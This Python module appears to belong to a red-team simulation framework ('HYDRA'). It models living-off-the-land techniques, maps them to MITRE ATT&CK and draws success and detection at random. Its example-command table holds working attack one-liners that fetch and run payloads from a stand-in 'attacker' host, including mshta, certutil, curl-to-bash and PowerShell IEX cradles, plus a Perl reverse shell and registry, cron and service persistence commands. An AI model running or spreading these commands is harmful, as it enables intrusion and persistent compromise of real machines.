"""
Living Off The Land Module for HYDRA

This module implements living-off-the-land techniques for the red agent,
simulating the use of legitimate system tools and binaries for malicious purposes.
"""

import random
import time
from datetime import datetime
from enum import Enum
import json
import os

# Import attack framework
from agents.attack_framework import ATTCKTactic, ATTCKTechnique

class LOLBinTechnique(Enum):
    """Enum for Living Off The Land Binary techniques"""
    POWERSHELL_EXECUTION = "powershell_execution"
    WMI_EXECUTION = "wmi_execution"
    WMIC_EXECUTION = "wmic_execution"
    REGSVR32_EXECUTION = "regsvr32_execution"
    MSHTA_EXECUTION = "mshta_execution"
    RUNDLL32_EXECUTION = "rundll32_execution"
    CERTUTIL_EXECUTION = "certutil_execution"
    BITSADMIN_EXECUTION = "bitsadmin_execution"
    MSIEXEC_EXECUTION = "msiexec_execution"
    INSTALLUTIL_EXECUTION = "installutil_execution"
    BASH_EXECUTION = "bash_execution"
    PYTHON_EXECUTION = "python_execution"
    PERL_EXECUTION = "perl_execution"
    CRON_PERSISTENCE = "cron_persistence"
    SCHEDULED_TASK = "scheduled_task"
    REGISTRY_PERSISTENCE = "registry_persistence"
    STARTUP_FOLDER = "startup_folder"
    SERVICE_CREATION = "service_creation"
    FILELESS_EXECUTION = "fileless_execution"

# Mapping LOLBin techniques to MITRE ATT&CK techniques
LOLBIN_TO_ATTCK = {
    LOLBinTechnique.POWERSHELL_EXECUTION.value: ATTCKTechnique.COMMAND_AND_SCRIPTING_INTERPRETER,
    LOLBinTechnique.WMI_EXECUTION.value: ATTCKTechnique.WINDOWS_MANAGEMENT_INSTRUMENTATION,
    LOLBinTechnique.WMIC_EXECUTION.value: ATTCKTechnique.WINDOWS_MANAGEMENT_INSTRUMENTATION,
    LOLBinTechnique.REGSVR32_EXECUTION.value: ATTCKTechnique.REGSVR32,
    LOLBinTechnique.MSHTA_EXECUTION.value: ATTCKTechnique.MSHTA,
    LOLBinTechnique.RUNDLL32_EXECUTION.value: ATTCKTechnique.RUNDLL32,
    LOLBinTechnique.CERTUTIL_EXECUTION.value: ATTCKTechnique.SIGNED_BINARY_PROXY_EXECUTION,
    LOLBinTechnique.BITSADMIN_EXECUTION.value: ATTCKTechnique.BITS_JOBS,
    LOLBinTechnique.MSIEXEC_EXECUTION.value: ATTCKTechnique.SIGNED_BINARY_PROXY_EXECUTION,
    LOLBinTechnique.INSTALLUTIL_EXECUTION.value: ATTCKTechnique.SIGNED_BINARY_PROXY_EXECUTION,
    LOLBinTechnique.BASH_EXECUTION.value: ATTCKTechnique.COMMAND_AND_SCRIPTING_INTERPRETER,
    LOLBinTechnique.PYTHON_EXECUTION.value: ATTCKTechnique.COMMAND_AND_SCRIPTING_INTERPRETER,
    LOLBinTechnique.PERL_EXECUTION.value: ATTCKTechnique.COMMAND_AND_SCRIPTING_INTERPRETER,
    LOLBinTechnique.CRON_PERSISTENCE.value: ATTCKTechnique.SCHEDULED_TASK,
    LOLBinTechnique.SCHEDULED_TASK.value: ATTCKTechnique.SCHEDULED_TASK,
    LOLBinTechnique.REGISTRY_PERSISTENCE.value: ATTCKTechnique.REGISTRY_RUN_KEYS_STARTUP_FOLDER,
    LOLBinTechnique.STARTUP_FOLDER.value: ATTCKTechnique.REGISTRY_RUN_KEYS_STARTUP_FOLDER,
    LOLBinTechnique.SERVICE_CREATION.value: ATTCKTechnique.CREATE_OR_MODIFY_SYSTEM_PROCESS,
    LOLBinTechnique.FILELESS_EXECUTION.value: ATTCKTechnique.REFLECTIVE_CODE_LOADING
}

# Mapping OS types to compatible LOLBin techniques
OS_TO_LOLBIN = {
    "Windows": [
        LOLBinTechnique.POWERSHELL_EXECUTION.value,
        LOLBinTechnique.WMI_EXECUTION.value,
        LOLBinTechnique.WMIC_EXECUTION.value,
        LOLBinTechnique.REGSVR32_EXECUTION.value,
        LOLBinTechnique.MSHTA_EXECUTION.value,
        LOLBinTechnique.RUNDLL32_EXECUTION.value,
        LOLBinTechnique.CERTUTIL_EXECUTION.value,
        LOLBinTechnique.BITSADMIN_EXECUTION.value,
        LOLBinTechnique.MSIEXEC_EXECUTION.value,
        LOLBinTechnique.INSTALLUTIL_EXECUTION.value,
        LOLBinTechnique.SCHEDULED_TASK.value,
        LOLBinTechnique.REGISTRY_PERSISTENCE.value,
        LOLBinTechnique.STARTUP_FOLDER.value,
        LOLBinTechnique.SERVICE_CREATION.value,
        LOLBinTechnique.FILELESS_EXECUTION.value
    ],
    "Linux": [
        LOLBinTechnique.BASH_EXECUTION.value,
        LOLBinTechnique.PYTHON_EXECUTION.value,
        LOLBinTechnique.PERL_EXECUTION.value,
        LOLBinTechnique.CRON_PERSISTENCE.value,
        LOLBinTechnique.SERVICE_CREATION.value,
        LOLBinTechnique.FILELESS_EXECUTION.value
    ],
    "macOS": [
        LOLBinTechnique.BASH_EXECUTION.value,
        LOLBinTechnique.PYTHON_EXECUTION.value,
        LOLBinTechnique.PERL_EXECUTION.value,
        LOLBinTechnique.CRON_PERSISTENCE.value,
        LOLBinTechnique.STARTUP_FOLDER.value,
        LOLBinTechnique.FILELESS_EXECUTION.value
    ]
}

# Example commands for each technique
LOLBIN_EXAMPLE_COMMANDS = {
    LOLBinTechnique.POWERSHELL_EXECUTION.value: "powershell -enc <base64_encoded_payload>",
    LOLBinTechnique.WMI_EXECUTION.value: "wmic process call create 'powershell -enc <base64_encoded_payload>'",
    LOLBinTechnique.WMIC_EXECUTION.value: "wmic /node:localhost process call create 'cmd.exe /c <command>'",
    LOLBinTechnique.REGSVR32_EXECUTION.value: "regsvr32 /s /u /i:malicious.sct scrobj.dll",
    LOLBinTechnique.MSHTA_EXECUTION.value: "mshta javascript:a=GetObject('script:http://attacker/payload.sct').Exec();close();",
    LOLBinTechnique.RUNDLL32_EXECUTION.value: "rundll32.exe javascript:'..\mshtml,RunHTMLApplication';document.write();GetObject('script:http://attacker/payload.sct')",
    LOLBinTechnique.CERTUTIL_EXECUTION.value: "certutil -urlcache -split -f http://attacker/payload.exe",
    LOLBinTechnique.BITSADMIN_EXECUTION.value: "bitsadmin /transfer myJob /download /priority high http://attacker/payload.exe %temp%\\payload.exe",
    LOLBinTechnique.MSIEXEC_EXECUTION.value: "msiexec /q /i http://attacker/payload.msi",
    LOLBinTechnique.INSTALLUTIL_EXECUTION.value: "installutil /logfile= /LogToConsole=false /U payload.dll",
    LOLBinTechnique.BASH_EXECUTION.value: "bash -c 'curl -s http://attacker/payload.sh | bash'",
    LOLBinTechnique.PYTHON_EXECUTION.value: "python -c 'import urllib.request; exec(urllib.request.urlopen(\"http://attacker/payload.py\").read())'",
    LOLBinTechnique.PERL_EXECUTION.value: "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    LOLBinTechnique.CRON_PERSISTENCE.value: "echo '* * * * * curl -s http://attacker/payload.sh | bash' | crontab -",
    LOLBinTechnique.SCHEDULED_TASK.value: "schtasks /create /tn \"MyTask\" /tr \"powershell -enc <base64_encoded_payload>\" /sc daily /st 12:00",
    LOLBinTechnique.REGISTRY_PERSISTENCE.value: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyPayload /t REG_SZ /d \"C:\\path\\to\\payload.exe\"",
    LOLBinTechnique.STARTUP_FOLDER.value: "copy payload.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
    LOLBinTechnique.SERVICE_CREATION.value: "sc create MyService binPath= \"C:\\path\\to\\payload.exe\"",
    LOLBinTechnique.FILELESS_EXECUTION.value: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1');\");"
}

class LivingOffTheLand:
    """Class for living-off-the-land operations"""
    def __init__(self, env, skill_level=0.7):
        self.env = env
        self.skill_level = skill_level
        self.lolbin_history = []
        self.persistence_mechanisms = {}  # Format: {node_id: [persistence_objects]}

    def execute_lolbin(self, node_id, technique=None, purpose="execution"):
        """
        Execute a living-off-the-land technique on a node.
        Purpose can be 'execution', 'persistence', 'lateral_movement', or 'data_collection'.
        Returns a tuple of (success, details, detected)
        """
        if node_id not in self.env.compromised_nodes:
            return False, None, False

        # Get node information
        if node_id not in self.env.graph:
            return False, None, False

        node_info = self.env.graph.nodes[node_id]
        os_type = node_info.get('os', {}).get('type', 'Unknown')

        # Select technique if not specified
        if technique is None:
            technique = self._select_lolbin_technique(os_type, purpose)

        # Check if technique is compatible with OS
        if os_type in OS_TO_LOLBIN and technique not in OS_TO_LOLBIN[os_type]:
            # Fall back to a compatible technique
            compatible_techniques = OS_TO_LOLBIN.get(os_type, [LOLBinTechnique.BASH_EXECUTION.value])
            technique = random.choice(compatible_techniques)

        # Calculate success probability based on skill level and security controls
        security_controls = node_info.get('security_controls', [])
        detection_probability = self._calculate_detection_probability(technique, security_controls)
        success_probability = self.skill_level * (1 - detection_probability * 0.5)

        # Determine success and detection
        success = random.random() < success_probability
        detected = random.random() < detection_probability

        # Generate execution details
        details = None
        if success:
            details = self._generate_execution_details(node_id, technique, purpose, os_type)
            
            # If purpose is persistence, store the persistence mechanism
            if purpose == "persistence":
                if node_id not in self.persistence_mechanisms:
                    self.persistence_mechanisms[node_id] = []
                self.persistence_mechanisms[node_id].append(details)

            # Log the LOLBin execution
            self.env.logs.append(f"Living-off-the-land technique {technique} executed on node {node_id} for {purpose}")
        else:
            # Log the failed attempt
            self.env.logs.append(f"Living-off-the-land technique {technique} failed on node {node_id}")

        # Generate an alert if detected
        if detected:
            self.env.alerts.append({
                "type": "lolbin_execution",
                "node_id": node_id,
                "technique": technique,
                "purpose": purpose,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })

        # Record the LOLBin execution attempt
        execution_record = {
            "node_id": node_id,
            "technique": technique,
            "purpose": purpose,
            "success": success,
            "detected": detected,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attck_technique": LOLBIN_TO_ATTCK.get(technique, "unknown"),
            "example_command": LOLBIN_EXAMPLE_COMMANDS.get(technique, "")
        }
        self.lolbin_history.append(execution_record)

        return success, details, detected

    def _select_lolbin_technique(self, os_type, purpose):
        """Select an appropriate LOLBin technique based on OS type and purpose"""
        compatible_techniques = OS_TO_LOLBIN.get(os_type, [])
        
        # Filter techniques based on purpose
        if purpose == "persistence":
            persistence_techniques = [
                LOLBinTechnique.SCHEDULED_TASK.value,
                LOLBinTechnique.REGISTRY_PERSISTENCE.value,
                LOLBinTechnique.STARTUP_FOLDER.value,
                LOLBinTechnique.SERVICE_CREATION.value,
                LOLBinTechnique.CRON_PERSISTENCE.value
            ]
            filtered_techniques = [t for t in compatible_techniques if t in persistence_techniques]
        else:
            # For execution, lateral movement, data collection
            execution_techniques = [t for t in compatible_techniques if t not in [
                LOLBinTechnique.SCHEDULED_TASK.value,
                LOLBinTechnique.REGISTRY_PERSISTENCE.value,
                LOLBinTechnique.STARTUP_FOLDER.value,
                LOLBinTechnique.SERVICE_CREATION.value,
                LOLBinTechnique.CRON_PERSISTENCE.value
            ]]
            filtered_techniques = execution_techniques
            
        if filtered_techniques:
            return random.choice(filtered_techniques)
        else:
            # Fallback to any compatible technique
            return random.choice(compatible_techniques) if compatible_techniques else LOLBinTechnique.BASH_EXECUTION.value

    def _calculate_detection_probability(self, technique, security_controls):
        """Calculate the probability of detection based on technique and security controls"""
        base_detection = 0.3  # Base detection probability
        
        # Adjust based on technique (some are stealthier than others)
        if technique in [LOLBinTechnique.POWERSHELL_EXECUTION.value, LOLBinTechnique.BASH_EXECUTION.value]:
            base_detection += 0.1  # Common techniques may be more monitored
        elif technique in [LOLBinTechnique.FILELESS_EXECUTION.value, LOLBinTechnique.REGSVR32_EXECUTION.value]:
            base_detection -= 0.1  # Stealthier techniques
            
        # Adjust based on security controls
        if "EDR" in security_controls:
            base_detection += 0.3
        if "Antivirus" in security_controls:
            base_detection += 0.1
        if "File Integrity Monitoring" in security_controls:
            base_detection += 0.2
            
        # Ensure probability is between 0 and 1
        return max(0.1, min(0.9, base_detection))

    def _generate_execution_details(self, node_id, technique, purpose, os_type):
        """Generate execution details for the LOLBin technique"""
        example_command = LOLBIN_EXAMPLE_COMMANDS.get(technique, "unknown command")
        
        return {
            "node_id": node_id,
            "technique": technique,
            "purpose": purpose,
            "os_type": os_type,
            "command": example_command,
            "attck_technique": LOLBIN_TO_ATTCK.get(technique, "unknown"),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    def get_lolbin_report(self):
        """Generate a report of living-off-the-land activities"""
        return {
            "execution_attempts": len(self.lolbin_history),
            "successful_executions": sum(1 for record in self.lolbin_history if record["success"]),
            "detected_executions": sum(1 for record in self.lolbin_history if record["detected"]),
            "techniques_used": list(set(record["technique"] for record in self.lolbin_history)),
            "attck_techniques": list(set(record["attck_technique"] for record in self.lolbin_history)),
            "persistence_mechanisms": self.persistence_mechanisms,
            "detailed_history": self.lolbin_history
        }
